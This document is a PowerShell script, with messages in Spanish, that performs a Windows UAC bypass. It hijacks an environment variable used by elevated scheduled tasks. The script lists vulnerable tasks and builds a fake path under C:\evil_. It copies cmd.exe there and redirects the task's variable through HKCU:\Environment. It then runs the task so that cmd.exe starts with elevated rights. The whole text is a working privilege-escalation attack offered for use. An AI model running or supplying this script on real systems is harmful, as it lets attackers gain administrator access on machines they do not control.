$tasks = Get-ScheduledTask | 
    Where-Object { $_.Principal.RunLevel -ne "Limited" -and 
                   $_.Principal.LogonType -ne "ServiceAccount" -and 
                   $_.State -ne "Disabled" -and 
                   $_.Principal.id -eq "Authenticated Users" -and 
                   $_.Actions[0].execute -match "\%[a-z0-9_.-]*\%[a-z0-9_.-]*"}

Write-Host "Tareas vulnerables:"
for($i=0;$i -lt $tasks.length + 1;$i++){
$taskName = $tasks[$i].TaskName
    Write-Host "[$i] - $taskName"
}
Write-Host -NoNewline "Selecciona tarea para realizar el bypass: "
 [Int]$taskNumber = Read-Host
 
 if($taskNumber -gt $tasks.length + 1 -or $taskNumber -lt 0){
    Write-Warning "Opción invalida. Saliendo..."
    exit
    }

 $task = $tasks[$taskNumber]
 $taskPath = $task.TaskPath + $task.TaskName

 $fullPath = $task.Actions[0].Execute
 if(!$path -match "\%[a-z0-9_.-]*\%"){
    Write-Warning "Tarea no apta para el bypass. Saliendo..."
 }
 $enviromantVariable = $matches[0]
 $enviromentVariableName = $enviromantVariable -replace '%','' 
 $fakePath = "C:\evil_" + $task.TaskName
 $newPath = $fullPath.replace($enviromantVariable,$fakePath)
 
 $folderPath = Split-Path $newPath

 $null = New-Item -Path $folderPath -ItemType directory -Force

 Write-Host "Estructura de carpetas falsas creadas. $folderPath"

 $cmd = "C:\WINDOWS\system32\cmd.exe"

 Copy-Item $cmd -Destination $newPath -Force

 Write-Host "$cmd copiado como $newPath."

 $null = New-ItemProperty -Path "HKCU:\Environment" -Name $enviromentVariableName -Value $fakePath -Force

 Write-Host "Valor de $enviromentVariableName cambiado a $fakePath"

 Write-Host "Ejecutando $taskName"

 $null = "schtasks /Run /TN $taskPath /I" | IEX
